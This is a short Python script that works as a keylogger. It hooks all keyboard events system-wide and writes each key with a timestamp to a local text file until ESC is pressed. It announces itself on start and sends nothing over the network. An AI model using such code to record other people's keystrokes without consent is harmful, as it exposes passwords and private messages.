import keyboard
from datetime import datetime  # Add this import

def on_key(event):
    if event.event_type == "down":
        with open("keystrokes.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            
            f.write(timestamp)
            f.write(event.name)
            ''' 
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                f.write("\n")
            else:
                f.write(event.name)
            '''
            f.write("\n")  # Add a newline after each key event

keyboard.hook(on_key)
print("Logging keystrokes. Press ESC to stop.")
keyboard.wait("esc")